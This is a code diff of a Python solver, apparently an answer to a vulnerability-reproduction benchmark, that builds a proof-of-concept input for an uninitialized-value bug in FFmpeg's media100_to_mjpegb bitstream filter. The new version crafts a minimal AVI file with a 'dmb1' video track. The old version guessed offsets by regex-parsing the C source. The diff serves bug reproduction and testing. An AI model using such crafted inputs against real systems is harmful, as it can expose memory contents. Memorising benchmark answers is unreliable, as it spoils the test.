@@ -1,83 +1,76 @@
-import tarfile
-import re
 import struct
 
 class Solution:
     def solve(self, src_path: str) -> bytes:
         """
-        Generate a PoC that triggers the Uninitialized Value vulnerability in media100_to_mjpegb.
+        Generate a PoC that triggers the vulnerability.
         
-        Strategy:
-        1. Extract the 'media100_to_mjpegb_bsf.c' source from the tarball to analyze constraints.
-        2. Identify input size requirements and valid offset locations by regex parsing the C code.
-        3. Construct a byte buffer that satisfies the size check.
-        4. Populate identified offset fields with pointers into the buffer to ensure the BSF 
-           processes the data and triggers the output allocation where the uninitialized padding issue resides.
+        The vulnerability is in the bsf/media100_to_mjpegb module, specifically an uninitialized 
+        value usage due to output buffer padding not being cleared. To trigger this, we generate 
+        a valid AVI file with a video track encoded as 'dmb1' (Media 100). When processed, 
+        FFmpeg will engage the media100_to_mjpegb bitstream filter.
         """
         
-        # Ground truth length is 1025, which is a safe default.
-        default_len = 1025
-        bsf_source = ""
+        def pack_fourcc(s):
+            return s.encode('ascii') if isinstance(s, str) else s
+
+        def make_chunk(tag, data):
+            pad = b''
+            if len(data) % 2 == 1:
+                pad = b'\x00'
+            return pack_fourcc(tag) + struct.pack('<I', len(data)) + data + pad
+
+        def make_list(list_type, chunks):
+            return make_chunk('LIST', pack_fourcc(list_type) + b''.join(chunks))
+
+        # AVI Parameters
+        width = 128
+        height = 128
+        fps = 30
         
-        # 1. Try to extract source code for analysis
-        try:
-            with tarfile.open(src_path, 'r') as tar:
-                for member in tar.getmembers():
-                    if member.name.endswith('media100_to_mjpegb_bsf.c'):
-                        f = tar.extractfile(member)
-                        if f:
-                            bsf_source = f.read().decode('utf-8', errors='ignore')
-                        break
-        except Exception:
-            # Fallback if tar extraction fails
-            pass
+        # --- AVI Header (avih) ---
+        # 56 bytes structure
+        # MicroSecPerFrame, MaxBytesPerSec, PaddingGranularity, Flags, TotalFrames, 
+        # InitialFrames, Streams, SuggestedBufferSize, Width, Height, Reserved[4]
+        avih = struct.pack('<IIIIIIIIII4I',
+            33333, 0, 0, 0, 1, 0, 1, 0, width, height, 0, 0, 0, 0
+        )
+        avih_chunk = make_chunk('avih', avih)
 
-        offsets_to_patch = set()
-        min_size = 0
+        # --- Stream Header (strh) ---
+        # 56 bytes structure
+        # fccType, fccHandler, Flags, Priority, Language, InitialFrames, Scale, Rate, ...
+        # Handler 'dmb1' triggers Media 100 processing
+        strh = struct.pack('<4s4sIIIIIIIIIIHHI',
+            b'vids', b'dmb1', 0, 0, 0, 0, 1, fps, 0, 1, 0, 0, 0, 0, 0
+        )
+        strh_chunk = make_chunk('strh', strh)
 
-        # 2. Analyze source constraints
-        if bsf_source:
-            # Find minimum size check: "if (in->size < 123)"
-            size_matches = re.findall(r'(?:in|pkt)->size\s*<\s*(\d+)', bsf_source)
-            for m in size_matches:
-                v = int(m)
-                if v > min_size:
-                    min_size = v
-            
-            # Find offset reads: "AV_RB32(in->data + 123)"
-            # These are locations where the code expects 32-bit integers, likely offsets
-            read_matches = re.findall(r'AV_R[BL]32\s*\(\s*(?:in|pkt)->data\s*\+\s*(\d+)\s*\)', bsf_source)
-            for m in read_matches:
-                offsets_to_patch.add(int(m))
-        else:
-            # Fallback constraints if source not found
-            # Known/Likely offsets for Media100 headers
-            offsets_to_patch = {8, 12, 16}
-            min_size = 128
+        # --- Stream Format (strf) ---
+        # BITMAPINFOHEADER (40 bytes)
+        # Size, Width, Height, Planes, BitCount, Compression, SizeImage, ...
+        # Compression 'dmb1' is critical
+        frame_data_len = 256
+        strf = struct.pack('<IIIHH4sIIIIII',
+            40, width, height, 1, 24, b'dmb1', frame_data_len, 0, 0, 0, 0
+        )
+        strf_chunk = make_chunk('strf', strf)
 
-        # 3. Construct the buffer
-        # Ensure buffer is large enough for min_size and ground truth heuristic
-        final_len = max(default_len, min_size + 128)
-        poc = bytearray(final_len)
+        # --- Lists Construction ---
+        strl_list = make_list('strl', [strh_chunk, strf_chunk])
+        hdrl_list = make_list('hdrl', [avih_chunk, strl_list])
 
-        # 4. Populate Offsets
-        # Set a data pointer that points to valid data area within the buffer
-        # This prevents out-of-bounds reads and ensures the conversion logic proceeds
-        data_ptr = min_size + 64 if min_size > 0 else 256
-        if data_ptr >= final_len:
-            data_ptr = final_len // 2
+        # --- Frame Data ---
+        # Simple payload. The vulnerability relies on the BSF processing this packet 
+        # and producing an output packet with uninitialized padding. 
+        # 0x11 to avoid completely empty/black checks if any.
+        payload = b'\x11' * frame_data_len
+        
+        # --- Movie List (movi) ---
+        # '00dc' corresponds to Stream 00 Compressed Video
+        movi_list = make_list('movi', [make_chunk('00dc', payload)])
 
-        sorted_offsets = sorted(list(offsets_to_patch))
-        for off in sorted_offsets:
-            if off + 4 <= final_len:
-                # Write a valid offset (Big Endian, as is standard for Media100/Qt)
-                struct.pack_into('>I', poc, off, data_ptr)
-                
-                # Advance pointer to simulate different fields/chunks
-                data_ptr += 128
-                # Wrap around if needed to stay within bounds
-                if data_ptr >= final_len:
-                    data_ptr = (min_size + 64) if min_size > 0 else 256
-                    if data_ptr >= final_len: data_ptr = 64
-
-        return bytes(poc)
+        # --- Final RIFF AVI Container ---
+        avi_file = make_chunk('RIFF', b'AVI ' + hdrl_list + movi_list)
+        
+        return avi_file
